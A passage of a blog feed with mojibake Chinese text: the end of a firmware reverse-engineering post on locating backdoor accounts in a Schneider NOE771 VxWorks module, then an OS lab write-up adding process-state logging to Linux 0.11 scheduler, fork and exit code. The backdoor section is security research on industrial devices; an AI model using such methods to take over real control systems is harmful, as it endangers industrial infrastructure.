-&gt; usrKernelInit -&gt; usrRoot -&gt; usrAppInit</code></p><p><img src="https://i.loli.net/2021/08/26/Yc36jsGPJul7V2B.png" alt=""></p><p>åœ¨è¿™é‡Œå‘ç°å¤šæ¬¡è°ƒç”¨æ·»åŠ è´¦æˆ·çš„functionï¼Œç„¶åæ ¹æ®è¿™ä¸ªå°±èƒ½æ‘¸åˆ°å¤šä¸ªåé—¨è´¦æˆ·å’Œå¯†ç ã€‚<br><img src="https://i.loli.net/2021/08/26/D1Zk7UmHTocXrxN.png" alt=""></p><p><img src="https://i.loli.net/2021/08/26/MuvYWT9pCnRJDXU.png" alt=""></p><p>æ€»ç»“ä¸€ä¸‹ï¼Œè¿˜æœ‰å¾ˆå¤šåœ°æ–¹ä¸æ‡‚ï¼Œæ¯”å¦‚è¿™ç§æ¶æ„çš„æŒ‡ä»¤é›†ï¼ŒVxWorksçš„ä¸€äº›çŸ¥è¯†ï¼Œä¸€äº›ç»†èŠ‚é—®é¢˜ï¼Œæ¯”å¦‚ç¬¦å·è¡¨çš„å¼€å§‹åœ°å€å’Œç»“æŸåœ°å€ç¡®å®šï¼Œä¸€å¼€å§‹æ˜¯010editorä¸­çš„åœ°å€ï¼Œåæ¥å•¥ä¹Ÿå‡ºä¸æ¥ï¼Œå°±å¾€åç§»åŠ¨äº†å››ä¸ªå­—èŠ‚ï¼Œæ‰æ˜¾ç¤ºå‡ºä¿®å¤çš„å‡½æ•°åï¼Œidapythonçš„ç”¨æ³•ï¼Œä»¥åŠç¬¦å·è¡¨ä¸­çš„ç¬¬ä¸€é¡¹å¯¹åº”APP_STATION_MODBUSã€‚</p><p>æ€»ä¹‹ï¼Œå¬äº†å‰‘é”‹è€å¸ˆçš„è¯ï¼Œè¿˜æ˜¯è¦å¤šç§¯ç´¯ç»éªŒï¼Œæ¯•ç«Ÿå½“åˆæ ˆæº¢å‡ºret2textçš„æ—¶å€™ä¹Ÿä¸æ‡‚å•¥æ˜¯pltå’Œgotï¼ˆç¬‘</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>å·¥æ§æ¼æ´æŒ–æ˜æ–¹æ³•ä¹‹å›ºä»¶é€†å‘åˆ†æï¼š<a href="https://paper.seebug.org/613/#22noe-771">https://paper.seebug.org/613/#22noe-771</a></p><p>æ–½è€å¾· NOE771 åé—¨åˆ†æï¼š<a href="https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/">https://p1kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/</a></p><p>æ–½è€å¾·PLCä»¥å¤ªç½‘æ¨¡å—å›ºä»¶NOE77101åé—¨è´¦æˆ·æ¼æ´ï¼š<a href="https://blog.csdn.net/weixin_43815930/article/details/107646507">https://blog.csdn.net/weixin_43815930/article/details/107646507</a></p><p>NOE77101 vxworksåé—¨è´¦æˆ·åˆ†æï¼š<a href="http://www.atomsec.org/iot/noe77101-vxworks%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E5%88%86%E6%9E%90/">http://www.atomsec.org/iot/noe77101-vxworks%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E5%88%86%E6%9E%90/</a></p><p>åŸºäº VxWorks çš„åµŒå…¥å¼è®¾å¤‡å›ºä»¶åˆ†ææ–¹æ³•ä»‹ç»ï¼š<a href="https://paper.seebug.org/771/#1">https://paper.seebug.org/771/#1</a></p><p>VxWorkså¯åŠ¨ä»£ç usrInit()å‡½æ•°åˆ†æï¼š<a href="https://blog.csdn.net/yinyansiniye/article/details/41926723">https://blog.csdn.net/yinyansiniye/article/details/41926723</a></p><p>Porting from IDAPython 6.x-7.3, to 7.4ï¼š<a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HIT-OSlab3</title>
      <link href="2021/08/22/HIT-OSlab3/"/>
      <url>2021/08/22/HIT-OSlab3/</url>
      
        <content type="html"><![CDATA[<p>åœ¨å€ŸåŠ©linux0.11å†…æ ¸ä»£ç å‰–æï¼Œåˆ«äººçš„å®éªŒä»£ç ï¼Œä»¥åŠæ“ä½œç³»ç»ŸåŸç†å®ç°ä¸å®è·µä¸‹å®ŒæˆQAQ</p><h2 id="process-c"><a href="#process-c" class="headerlink" title="process.c"></a>process.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/times.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HZ100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_PROCESS_NUM   10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> c_pr[CHILD_PROCESS_NUM];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c_pr[i] = fork();</span><br><span class="line">        <span class="keyword">if</span>(c_pr[i] == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// child process</span></span><br><span class="line">            cpuio_bound(<span class="number">20</span>, <span class="number">2</span> * i, <span class="number">20</span> - <span class="number">2</span> * i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// æ‰§è¡Œå®Œcpuio_bound ç»“æŸå­è¿›ç¨‹</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c_pr[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process %d failed to fork!\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child Process ID:%d\n&quot;</span>, c_pr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    wait();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ­¤å‡½æ•°æŒ‰ç…§å‚æ•°å ç”¨CPUå’ŒI/Oæ—¶é—´</span></span><br><span class="line"><span class="comment"> * last: å‡½æ•°å®é™…å ç”¨CPUå’ŒI/Oçš„æ€»æ—¶é—´ï¼Œä¸å«åœ¨å°±ç»ªé˜Ÿåˆ—ä¸­çš„æ—¶é—´ï¼Œ&gt;=0æ˜¯å¿…é¡»çš„</span></span><br><span class="line"><span class="comment"> * cpu_time: ä¸€æ¬¡è¿ç»­å ç”¨CPUçš„æ—¶é—´ï¼Œ&gt;=0æ˜¯å¿…é¡»çš„</span></span><br><span class="line"><span class="comment"> * io_time: ä¸€æ¬¡I/Oæ¶ˆè€—çš„æ—¶é—´ï¼Œ&gt;=0æ˜¯å¿…é¡»çš„</span></span><br><span class="line"><span class="comment"> * å¦‚æœlast &gt; cpu_time + io_timeï¼Œåˆ™å¾€å¤å¤šæ¬¡å ç”¨CPUå’ŒI/O</span></span><br><span class="line"><span class="comment"> * æ‰€æœ‰æ—¶é—´çš„å•ä½ä¸ºç§’</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tms</span> <span class="title">start_time</span>, <span class="title">current_time</span>;</span></span><br><span class="line"><span class="keyword">clock_t</span> utime, stime;</span><br><span class="line"><span class="keyword">int</span> sleep_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (last &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* CPU Burst */</span></span><br><span class="line">times(&amp;start_time);</span><br><span class="line"><span class="comment">/* å…¶å®åªæœ‰t.tms_utimeæ‰æ˜¯çœŸæ­£çš„CPUæ—¶é—´ã€‚ä½†æˆ‘ä»¬æ˜¯åœ¨æ¨¡æ‹Ÿä¸€ä¸ª</span></span><br><span class="line"><span class="comment"> * åªåœ¨ç”¨æˆ·çŠ¶æ€è¿è¡Œçš„CPUå¤§æˆ·ï¼Œå°±åƒâ€œfor(;;);â€ã€‚æ‰€ä»¥æŠŠt.tms_stime</span></span><br><span class="line"><span class="comment"> * åŠ ä¸Šå¾ˆåˆç†ã€‚*/</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">times(&amp;current_time);</span><br><span class="line">utime = current_time.tms_utime - start_time.tms_utime;</span><br><span class="line">stime = current_time.tms_stime - start_time.tms_stime;</span><br><span class="line">&#125; <span class="keyword">while</span> ( ( (utime + stime) / HZ )  &lt; cpu_time );</span><br><span class="line">last -= cpu_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &lt;= <span class="number">0</span> )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IO Burst */</span></span><br><span class="line"><span class="comment">/* ç”¨sleep(1)æ¨¡æ‹Ÿ1ç§’é’Ÿçš„I/Oæ“ä½œ */</span></span><br><span class="line">sleep_time=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (sleep_time &lt; io_time)</span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">sleep_time++;</span><br><span class="line">&#125;</span><br><span class="line">last -= sleep_time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><p>å†…æ ¸çŠ¶æ€ä¸‹åªèƒ½ç”¨printkï¼Œæ ¹æ®è€å¸ˆçš„ä»£ç å¢åŠ fprintkå‡½æ•°ï¼Œåœ¨githubä¸Šæœ‰ç›¸å…³çš„resourceï¼Œé‚ä¸å†è®°å½•<br>å› ä¸ºè¦æ—©æ—©çš„å¼€å§‹è®°å½•æ—¥å¿—æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨è¿›ç¨‹0å¼€å§‹åœ¨ç”¨æˆ·æ€æ‰§è¡Œä»¥åå°±æ‰“å¼€æ—¥å¿—æ–‡ä»¶ï¼Œå¼€å¯äº†å¤šè¿›ç¨‹è§†å›¾ï¼Œè¿™ä¸ªæ—¶é—´ç‚¹å°±åœ¨move_to_user_mode()ä¹‹åï¼Œä½†æ˜¯è¿˜è¦å…ˆæŒ‚è½½ä¸Šæ–‡ä»¶ç³»ç»Ÿæ‰èƒ½è®°å½•ã€‚<br>å…³é”®ä»£ç å¦‚ä¸‹<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);    <span class="comment">// å®Œæˆäº†æ–‡ä»¶ç³»ç»ŸåŠ è½½</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/var/process.log&quot;</span>,O_CREAT|O_TRUNC|O_WRONLY,<span class="number">0666</span>);</span><br></pre></td></tr></table></figure></p><h2 id="fork-c"><a href="#fork-c" class="headerlink" title="fork.c"></a>fork.c</h2><p>å®Œæˆå¤šè¿›ç¨‹æ—¥å¿—è®°å½•æœ€é‡è¦çš„å°±æ˜¯æ‰¾åˆ°å†…æ ¸ä¸­å…³äºè¿›ç¨‹çŠ¶æ€ä»£ç çš„åˆ‡æ¢ç‚¹ï¼Œç„¶åæ·»åŠ ç›¸å…³ä»£ç å®Œæˆè®°å½•ã€‚<br>forké¦–å…ˆæ˜¯æ–°å»ºè¿›ç¨‹çš„åœ°æ–¹ï¼Œè¿™ä¸ªåœ°æ–¹è‚¯å®šè¦è®°å½•ï¼ŒçœŸæ­£å®ç°è¿›ç¨‹åˆ›å»ºçš„å‡½æ•°æ˜¯copy_process()å‡½æ•°ï¼Œå®Œæˆpcbç›¸å…³è®¾ç½®åå°†è¿›ç¨‹çŠ¶æ€è®¾ç½®ä¸ºå°±ç»ªï¼Œå³p-&gt;state = TASK_RUNNINGï¼Œè¿™é‡Œå°±è¦å‘æ—¥å¿—æ–‡ä»¶å†™ç›¸å…³è®°å½•ï¼Œåˆ†åˆ«æ˜¯æ–°å»ºå’Œè®°å½•ï¼ˆå…¶å®ä¸éš¾å‘ç°ï¼Œæ‰€æœ‰åº”è¯¥æ·»åŠ çš„ä»£ç ï¼Œéƒ½åº”è¯¥å›´ç»•p-&gt;stateè¿™ç§çŠ¶æ€è®¾ç½®ä»£ç æ¥å®Œæˆï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;N&#x27;</span>, jiffies);</span><br><span class="line">p-&gt;state = TASK_RUNNING;<span class="comment">/* do this last, just in case */</span></span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;J&#x27;</span>, jiffies);</span><br></pre></td></tr></table></figure><h2 id="sched-c"><a href="#sched-c" class="headerlink" title="sched.c"></a>sched.c</h2><p>sched.cæ˜¯å†…æ ¸ä¸­æœ‰æœ‰å…³è¿›ç¨‹è°ƒåº¦ç®¡ç†çš„ç¨‹åºï¼Œå…¶ä¸­åŒ…æ‹¬æœ‰å…³è°ƒåº¦çš„åŸºæœ¬å‡½æ•°sleep_on()ï¼Œwakeup()ï¼Œschedule()ç­‰ã€‚<br>è¦åšå‡ºä¿®æ”¹çš„å‡½æ•°æœ‰schedule(),sys_pause(),sleep_on(),interruptible_sleep_on(),wake_up()å‡½æ•°<br>ä¸ºäº†æ–¹ä¾¿ç›´æ¥è´´å‡ºæ‰€æœ‰ä»£ç ï¼ˆæ‡’ï¼‰<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">(*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">&#123;</span><br><span class="line">(*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>;</span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS;</span><br><span class="line">p = &amp;task[NR_TASKS];</span><br><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">c = (*p)-&gt;counter, next = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)</span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">(*p)-&gt;priority;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != task[next]-&gt;pid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;state == TASK_RUNNING)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tR\t%d\n&quot;</span>, task[next]-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">switch_to(next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_pause</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != <span class="number">0</span>)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp = *p;</span><br><span class="line">*p = current;</span><br><span class="line">current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp=*p;</span><br><span class="line">*p=current;</span><br><span class="line">repeat:current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="exit-c"><a href="#exit-c" class="headerlink" title="exit.c"></a>exit.c</h2><p>ä¿®æ”¹do_exitå’Œsys_waitpid<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_TASKS ; i++)</span><br><span class="line"><span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) &#123;</span><br><span class="line">task[i]-&gt;father = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (task[i]-&gt;state == TASK_ZOMBIE)</span><br><span class="line"><span class="comment">/* assumption task[1] is always init */</span></span><br><span class="line">(<span class="keyword">void</span>) send_sig(SIGCHLD, task[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)</span><br><span class="line"><span class="keyword">if</span> (current-&gt;filp[i])</span><br><span class="line">sys_close(i);</span><br><span class="line">iput(current-&gt;pwd);</span><br><span class="line">current-&gt;pwd=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;root);</span><br><span class="line">current-&gt;root=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;executable);</span><br><span class="line">current-&gt;executable=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty &gt;= <span class="number">0</span>)</span><br><span class="line">tty_table[current-&gt;tty].pgrp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">last_task_used_math = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader)</span><br><span class="line">kill_session();</span><br><span class="line">current-&gt;state = TASK_ZOMBIE;</span><br><span class="line">current-&gt;exit_code = code;</span><br><span class="line">tell_father(current-&gt;father);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tE\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> (<span class="number">-1</span>);<span class="comment">/* just to suppress warnings */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">unsigned</span> <span class="keyword">long</span> * stat_addr, <span class="keyword">int</span> options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag, code;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">verify_area(stat_addr,<span class="number">4</span>);</span><br><span class="line">repeat:</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*p || *p == current)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;father != current-&gt;pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pid != pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != current-&gt;pgrp)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != -pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> ((*p)-&gt;state) &#123;</span><br><span class="line"><span class="keyword">case</span> TASK_STOPPED:</span><br><span class="line"><span class="keyword">if</span> (!(options &amp; WUNTRACED))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">put_fs_long(<span class="number">0x7f</span>,stat_addr);</span><br><span class="line"><span class="keyword">return</span> (*p)-&gt;pid;</span><br><span class="line"><span class="keyword">case</span> TASK_ZOMBIE:</span><br><span class="line">current-&gt;cutime += (*p)-&gt;utime;</span><br><span class="line">current-&gt;cstime += (*p)-&gt;stime;</span><br><span class="line">flag = (*p)-&gt;pid;</span><br><span class="line">code = (*p)-&gt;exit_code;</span><br><span class="line">release(*p);</span><br><span class="line">put_fs_long(code,stat_addr);</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line"><span class="keyword">if</span> (options &amp; WNOHANG)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">current-&gt;state=TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (!(current-&gt;signal &amp;= ~(<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>))))</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -ECHILD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¤ªéš¾äº†å¤ªéš¾äº†ï¼Œå†…æ ¸å¤ªéš¾äº†â€¦â€¦</p>]]></content>
      
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-pwnåŸºç¡€çŸ¥è¯†å­¦ä¹ </title>
